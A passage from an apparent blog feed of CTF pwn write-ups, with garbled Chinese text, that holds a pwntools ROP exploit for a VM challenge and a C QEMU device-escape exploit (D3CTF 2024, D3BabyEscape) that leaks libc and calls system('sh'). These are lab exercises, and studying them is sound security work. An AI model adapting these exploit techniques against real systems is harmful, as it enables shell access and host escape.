class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inst</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mem</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">3</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reg</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">args</span>(<span class="hljs-params">flag1,flag2,arg1,arg2</span>):<br>    var=(flag1|(flag2&lt;&lt;<span class="hljs-number">2</span>)).to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)+arg1.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>    <span class="hljs-keyword">if</span> flag2==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> var+p64(arg2)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> var+arg2.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">arg</span>(<span class="hljs-params">flag,arg</span>):<br>    var=flag.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br>    <span class="hljs-keyword">if</span> flag==<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> var+p64(arg)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> var+arg.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x01&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x02&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rshift</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x03&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lshift</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x04&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mov</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x05&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">andd</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x06&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orr</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x07&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x08&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x09&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">arg</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0a&#x27;</span>+arg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">nop</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0b&#x27;</span><br><br><br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-comment"># libcbase</span><br>code=mov(args(reg(),inst(),<span class="hljs-number">0</span>,<span class="hljs-number">0x27ff8</span>))<br>code+=nop()<br>code+=mov(args(reg(),mem(),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=sub(args(reg(),inst(),<span class="hljs-number">1</span>,<span class="hljs-number">0x459a0</span>))<br>code+=nop()<br><br><span class="hljs-comment"># gap</span><br>code+=mov(args(reg(),inst(),<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=nop()<br><br><span class="hljs-comment"># membase</span><br>code+=mov(args(reg(),inst(),<span class="hljs-number">0</span>,<span class="hljs-number">0x28020</span>))<br>code+=nop()<br>code+=mov(args(reg(),mem(),<span class="hljs-number">2</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=sub(args(reg(),inst(),<span class="hljs-number">2</span>,<span class="hljs-number">0xc040</span>))<br>code+=nop()<br><br><span class="hljs-comment"># gap</span><br>code+=mov(args(reg(),inst(),<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=nop()<br><br><span class="hljs-comment"># save libcbase membase</span><br>code+=mov(args(mem(),reg(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<br>code+=nop()<br>code+=mov(args(reg(),inst(),<span class="hljs-number">0</span>,<span class="hljs-number">8</span>))<br>code+=nop()<br>code+=mov(args(mem(),reg(),<span class="hljs-number">0</span>,<span class="hljs-number">2</span>))<br>code+=nop()<br><br><span class="hljs-comment"># stack cal</span><br>code+=mov(args(reg(),inst(),<span class="hljs-number">0</span>,<span class="hljs-number">0x222200</span>))<br>code+=nop()<br>code+=add(args(reg(),reg(),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=sub(args(reg(),reg(),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>))<br>code+=nop()<br><br><span class="hljs-comment"># gap</span><br>code+=mov(args(reg(),inst(),<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=nop()<br><br><span class="hljs-comment"># stack</span><br>code+=mov(args(reg(),reg(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<br>code+=nop()<br>code+=mov(args(reg(),mem(),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=sub(args(reg(),inst(),<span class="hljs-number">1</span>,<span class="hljs-number">0x130</span>))<br>code+=nop()<br><br><span class="hljs-comment"># gap</span><br>code+=mov(args(reg(),inst(),<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=nop()<br><br><span class="hljs-comment"># pie</span><br>code+=mov(args(reg(),reg(),<span class="hljs-number">3</span>,<span class="hljs-number">1</span>))<br>code+=nop()<br>code+=sub(args(reg(),reg(),<span class="hljs-number">3</span>,<span class="hljs-number">2</span>))<br>code+=nop()<br>code+=mov(args(reg(),reg(),<span class="hljs-number">0</span>,<span class="hljs-number">3</span>))<br>code+=nop()<br>code+=mov(args(reg(),mem(),<span class="hljs-number">3</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=sub(args(reg(),inst(),<span class="hljs-number">3</span>,<span class="hljs-number">0x1ddd</span>))<br>code+=nop()<br>code+=add(args(reg(),inst(),<span class="hljs-number">3</span>,<span class="hljs-number">0x4200</span>-<span class="hljs-number">8</span>))<br>code+=nop()<br><br><span class="hljs-comment"># gap</span><br>code+=mov(args(reg(),inst(),<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=nop()<br><br><span class="hljs-comment"># change membase</span><br>code+=sub(args(reg(),reg(),<span class="hljs-number">3</span>,<span class="hljs-number">2</span>))<br>code+=nop()<br>code+=mov(args(reg(),mem(),<span class="hljs-number">2</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=mov(args(reg(),reg(),<span class="hljs-number">0</span>,<span class="hljs-number">3</span>))<br>code+=nop()<br>code+=mov(args(mem(),reg(),<span class="hljs-number">0</span>,<span class="hljs-number">1</span>))<br>code+=nop()<br><br><span class="hljs-comment"># gap</span><br>code+=mov(args(reg(),inst(),<span class="hljs-number">3</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=nop()<br><br>rdi=<span class="hljs-number">0x2a3e5</span><br>ret=<span class="hljs-number">0x29139</span><br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>system=libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment"># rop</span><br>code+=mov(args(reg(),reg(),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>))<br>code+=nop()<br>code+=add(args(reg(),inst(),<span class="hljs-number">1</span>,ret))<br>code+=nop()<br>code+=mov(args(reg(),inst(),<span class="hljs-number">3</span>,<span class="hljs-number">0</span>))<br>code+=nop()<br>code+=mov(args(mem(),reg(),<span class="hljs-number">3</span>,<span class="hljs-number">1</span>))<br>code+=nop()<br><br>code+=mov(args(reg(),reg(),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>))<br>code+=nop()<br>code+=add(args(reg(),inst(),<span class="hljs-number">1</span>,rdi))<br>code+=nop()<br>code+=mov(args(reg(),inst(),<span class="hljs-number">3</span>,<span class="hljs-number">8</span>))<br>code+=nop()<br>code+=mov(args(mem(),reg(),<span class="hljs-number">3</span>,<span class="hljs-number">1</span>))<br>code+=nop()<br><br>code+=mov(args(reg(),reg(),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>))<br>code+=nop()<br>code+=add(args(reg(),inst(),<span class="hljs-number">1</span>,bin_sh))<br>code+=nop()<br>code+=mov(args(reg(),inst(),<span class="hljs-number">3</span>,<span class="hljs-number">0x10</span>))<br>code+=nop()<br>code+=mov(args(mem(),reg(),<span class="hljs-number">3</span>,<span class="hljs-number">1</span>))<br>code+=nop()<br><br>code+=mov(args(reg(),reg(),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>))<br>code+=nop()<br>code+=add(args(reg(),inst(),<span class="hljs-number">1</span>,system))<br>code+=nop()<br>code+=mov(args(reg(),inst(),<span class="hljs-number">3</span>,<span class="hljs-number">0x18</span>))<br>code+=nop()<br>code+=mov(args(mem(),reg(),<span class="hljs-number">3</span>,<span class="hljs-number">1</span>))<br>code+=nop()<br><br><span class="hljs-comment"># end</span><br>code+=nop()<br>code+=nop()<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendafter(<span class="hljs-string">b&#x27;plz input your vm-code\n&#x27;</span>,code)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 d3ctf pwn wp</title>
    <link href="/2024/04/29/2024d3ctf-pwn-wp/"/>
    <url>/2024/04/29/2024d3ctf-pwn-wp/</url>
    
    <content type="html"><![CDATA[<p>æ¯”èµ›å°±åšäº†ä¸€ä¸ªç­¾åˆ°ä¸€ä¸ªphpï¼Œè¡¥ä¸€ä¸‹å¦å¤–ä¸¤é“èƒ½åšçš„</p><span id="more"></span><h1 id="D3BabyEscape"><a href="#D3BabyEscape" class="headerlink" title="D3BabyEscape"></a>D3BabyEscape</h1><h2 id="qemu-pwnåŸºç¡€çŸ¥è¯†"><a href="#qemu-pwnåŸºç¡€çŸ¥è¯†" class="headerlink" title="qemu pwnåŸºç¡€çŸ¥è¯†"></a>qemu pwnåŸºç¡€çŸ¥è¯†</h2><p>è§è¿™ä¸ªåšå®¢ğŸ‘‰<a href="https://xz.aliyun.com/t/6562?time__1311=n4+xnD0DRDBAi=GkDgiDlhjmBxQumwD34rD&alichlgref=https://xz.aliyun.com/u/15219">qemu pwn-åŸºç¡€çŸ¥è¯†</a></p><p>æ•°æ®ç»“æ„å…³ç³»å›¾ï¼Œä»¥blizzardctf2017çš„strngä¸ºä¾‹ï¼š</p><img src="/2024/04/29/2024d3ctf-pwn-wp/qemu.png" class title="qemu"><ul><li>TypeInfoï¼šå®šä¹‰ç±»ã€å®ä¾‹åˆå§‹åŒ–å‡½æ•°</li><li>class_initï¼šåˆå§‹åŒ–çˆ¶ç±»</li><li>instance_initï¼šåˆå§‹åŒ–å­ç±»ï¼ˆå¯¹åº”å…·ä½“è®¾å¤‡ï¼‰</li><li>realizeï¼šåˆå§‹åŒ–å®ä¾‹ï¼ˆä½¿ç”¨ï¼‰</li></ul><h2 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h2><p>çœ‹å¯åŠ¨è„šæœ¬ï¼Œè®¾å¤‡å«l0dev</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>./qemu-system-x86_64 \<br>-L ../pc-bios/ \<br>-m 128M \<br>-kernel vmlinuz \<br>-initrd rootfs.img \<br>-smp 1 \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr quiet&quot; \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic \<br>-monitor /dev/null \<br>-device l0dev<br></code></pre></td></tr></table></figure><p>æ»¤ä¸€ä¸‹å­—ç¬¦ä¸²</p><img src="/2024/04/29/2024d3ctf-pwn-wp/l0dev.png" class title="l0dev"><ul><li><p>l0devå¯ä»¥å®šä½åˆ°ldev_info</p><img src="/2024/04/29/2024d3ctf-pwn-wp/info.png" class title="info"><p>ç»§è€Œå®šä½åˆ°class_init</p><img src="/2024/04/29/2024d3ctf-pwn-wp/classinit.png" class title="classinit"></li><li><p>l0dev_realizeå¯ä»¥å®šä½åˆ°realize</p><img src="/2024/04/29/2024d3ctf-pwn-wp/realize.png" class title="realize"></li><li><p>l0dev_instance_initå¯ä»¥å®šä½åˆ°instance_init</p><img src="/2024/04/29/2024d3ctf-pwn-wp/instanceinit.png" class title="instanceinit"></li><li><p>å‰©ä¸‹çš„mmioå’Œpmioçš„readå’Œwriteå‡½æ•°ä¹Ÿå¯ä»¥é€šè¿‡å­—ç¬¦ä¸²å®šä½</p></li></ul><p>è¿˜åŸçš„l0dev_stateç»“æ„ä½“ï¼š</p><img src="/2024/04/29/2024d3ctf-pwn-wp/struct.png" class title="struct"><ul><li>l0dev_mmio_readï¼šè¯»æœ‰ä¸€ä¸ªacpi_indexçš„åç§»</li><li>l0dev_mmio_writeï¼šflagè®¾ç½®åå¯å¸¦acpi_indexåç§»å†™</li><li>l0dev_pmio_readï¼šè¯»å‡ºæ•°æ®ä¸º0x29Aæ—¶å¯é€’å¢flag</li><li>l0dev_pmio_writeï¼š<ul><li>addrä¸º0x40æ—¶è°ƒç”¨rand_r</li><li>addrä¸º0x80æ—¶è®¾ç½®acpi_index</li><li>å…¶ä»–æƒ…å†µæ­£å¸¸å†™</li></ul></li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>l0dev_class_initå¯ä»¥çœ‹å‡ºvendor_idæ˜¯0x1234ï¼Œdevice_idæ˜¯0x1919</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">/ # lspci<br>00:04.0 Class 00ff: 1234:1919<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">/ # cat /proc/ioports<br>  c000-c0ff : 0000:00:04.0<br></code></pre></td></tr></table></figure><p>å¾—åˆ°PMIOåœ°å€</p><p>æµç¨‹ï¼š</p><ul><li>mmio_writeè®¾ç½®acpi_index</li><li>mmio_readæº¢å‡ºæ³„æ¼r_rand</li><li>pmio_writeæ­£å¸¸å†™0x29A</li><li>pmio_readè¯»0x29Aè®¾ç½®flag</li><li>pmio_writeæº¢å‡ºå†™r_randä¸ºsystem</li><li>mmio_writeè°ƒç”¨r_randå‘½ä»¤æ‰§è¡Œ</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;termios.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br> <br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><br><br><span class="hljs-type">uint32_t</span> pmio_base = <span class="hljs-number">0xc000</span>;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">pmio_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br><span class="hljs-keyword">return</span> inl(pmio_base + addr) | ((<span class="hljs-type">uint64_t</span>)inl(pmio_base + addr + <span class="hljs-number">4</span>) &lt;&lt; <span class="hljs-number">32</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pmio_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr, <span class="hljs-type">uint64_t</span> val)</span><br>&#123;<br>outl(val &amp; <span class="hljs-number">0xffffffff</span>, pmio_base + addr);<br>outl(val &gt;&gt; <span class="hljs-number">32</span>, pmio_base + addr + <span class="hljs-number">4</span>);<br>&#125;<br><br><br><span class="hljs-type">char</span> *mmio_mem;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span><br>&#123;<br><span class="hljs-keyword">return</span> *((<span class="hljs-type">uint64_t</span> *)(mmio_mem + addr));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint64_t</span> val)</span><br>&#123;<br>*((<span class="hljs-type">uint64_t</span> *)(mmio_mem + addr)) = val;<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);<br>mmio_mem = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="hljs-number">0</span>);<br>iopl(<span class="hljs-number">3</span>);<br><br>mmio_write(<span class="hljs-number">0x80</span>, <span class="hljs-number">0x1c</span>);<br><span class="hljs-type">uint64_t</span> libcbase = mmio_read(<span class="hljs-number">0xf8</span>) - <span class="hljs-number">0x46780</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libcbase : %llx\n&quot;</span>, libcbase);<br><br><span class="hljs-type">uint64_t</span> system = libcbase + <span class="hljs-number">0x50d70</span>;<br>pmio_write(<span class="hljs-number">0</span>, <span class="hljs-number">0x29a</span>);<br>pmio_read(<span class="hljs-number">0</span>);<br><br>pmio_write(<span class="hljs-number">0xf8</span>, system);<br>mmio_write(<span class="hljs-number">0x40</span>, <span class="hljs-number">0x6873</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="write-flag-where"><a href="#write-flag-where" class="headerlink" title="write_flag_where"></a>write_flag_where</h1><p>å¯ä»¥å°†flagçš„æŸä¸€å­—èŠ‚å†™åˆ°libcä»£ç æ®µï¼Œè¾“å…¥ä¸åˆæ³•å°±é€€å‡ºï¼Œåˆæ³•å¯ä»¥ä¸€ç›´æ”¹ï¼ˆæ¯”èµ›çš„æ—¶å€™è¿˜çœ‹é”™é¢˜äº†ä»¥ä¸ºåªèƒ½æ”¹ä¸€æ¬¡ï¼‰</p><ul><li><p>ç¬¬ä¸€æ¬¡æ”¹0x8ca1d+libc_base+3ï¼Œ_IO_vtable_checkä¸­å–æŠ¥é”™å­—ç¬¦ä¸²çš„åç§»</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> attribute_hidden<br>_IO_vtable_check (<span class="hljs-type">void</span>)<br>&#123;<br><span class="hljs-comment">/* â€¦â€¦ */</span><br>  __libc_fatal (<span class="hljs-string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/04/29/2024d3ctf-pwn-wp/check.png" class title="check"></li><li><p>ç¬¬äºŒæ¬¡æ”¹libc_base+0x907a0+5ï¼Œå®é™…ä¸Šæ˜¯__uflowé‡Œè°ƒç”¨çš„IO_validate_vtableå–__io_vtablesåœ°å€çš„éƒ¨åˆ†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br><span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br>  <span class="hljs-type">uintptr_t</span> ptr = (<span class="hljs-type">uintptr_t</span>) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr - (<span class="hljs-type">uintptr_t</span>) &amp;__io_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= IO_VTABLES_LEN))<br>    <span class="hljs-comment">/* The vtable pointer is not in the expected section.  Use the</span><br><span class="hljs-comment">       slow path, which will terminate the process if necessary.  */</span><br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/04/29/2024d3ctf-pwn-wp/uflow.png" class title="uflow"></li></ul><p>ä¸¤æ¬¡æ”¹å®Œä¹‹åå†scanfè°ƒç”¨__uflowæ—¶ä¼šå› ä¸ºvtablesåç§»ä¸å¯¹æŠ¥é”™ï¼Œæ ¹æ®æŠ¥é”™å­—ç¬¦ä¸²çš„ç§»ä½å¯ä»¥åˆ¤æ–­flagå­—ç¬¦æ˜¯ä»€ä¹ˆ</p><p><em>æ‡’å¾—æ“expäº†å°±è¿™æ ·å§ï¼Œä¸€ç›´æƒ³æ”¹exitï¼ˆå› ä¸ºä»¥ä¸ºåªèƒ½æ”¹ä¸€æ¬¡ï¼‰èƒ½åšå‡ºæ¥æ‰æ€ª</em></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>qemu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2017-1002101</title>
    <link href="/2024/04/14/cve-2017-1002101/"/>
    <url>/2024/04/14/cve-2017-1002101/</url>
    
